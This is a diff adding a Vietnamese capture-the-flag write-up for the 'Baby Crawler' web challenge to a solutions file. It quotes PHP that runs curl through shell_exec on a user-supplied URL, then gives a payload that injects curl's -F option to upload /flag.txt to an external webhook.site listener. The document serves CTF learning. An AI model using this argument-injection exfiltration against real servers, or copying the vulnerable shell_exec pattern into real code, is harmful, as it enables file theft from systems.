@@ -44,6 +44,7 @@
 - [Remote File Inclusion](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#remote-file-inclusion)
 - [Upload File via URL](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#upload-file-via-url)
 - [The Evil Assignment on Canvas](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#the-evil-assignment-on-canvas)
+- [Baby Crawler]()
 ### HTTP Request Content-Length
 Challenge:
 
@@ -1262,6 +1263,47 @@ Tiếp theo, thay lệnh `id` thành `find / -name *.txt` để tìm file chứa
 
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image231.png?raw=true)
 
+### Baby Crawler
+
+![img](232)
+
+Khi click `CRAWL` thì server sẽ trả về một đường dẫn đến cached file:
+
+![img](233)
+
+Nội dung cached file là nội dung của trang web chứa bài báo đã nhập:
+
+![img](234)
+
+Kiểm tra source code, tôi tìm ra endpoint `/?debug`, thử truy cập, tìm ra đoạn mã PHP mà server dùng để xử lý logic:
+
+![img](235)
+
+Dựa vào đoạn này:
+
+    if(isset($_POST['url'])){
+    $url = $_POST['url'];
+    if(strpos($url, 'http') !== 0 ){
+        die('Only HTTP or HTTPS !');
+    }else{
+        $result = shell_exec('curl '. escapeshellcmd($url));
+        $cache_file = './cache/'.md5($url);
+        file_put_contents($cache_file, $result);
+        $data = parse_html($cache_file);      
+    }
+    }
+
+Tôi đã thử một loạt các payload để chèn vào URL nhằm mục đích đọc file `/flag.txt` nhưng không vượt qua được hàm `escapeshellcmd()`. Tiếp theo tôi thử gửi nội dung của file `/flag.txt` sang một server ngoài, bằng cách thêm tùy chọn `-F` (`curl` có hỗ trợ tùy chọn này, vd: `curl -F "file=@/path/to/abc.txt"`). Tôi sử dụng [Webhook.site](https://webhook.site/) để làm server lắng nghe. 
+
+Payload cuối cùng sẽ là:
+
+    https://webhook.site/9137bbd0-62c3-415c-90b1-1339560c6a01 -F "file=@/flag.txt"
+
+Click CRAWL, kiểm tra bên webhook:
+
+![img](236)
+
+=> Tải file và tìm được flag.
 
 
 
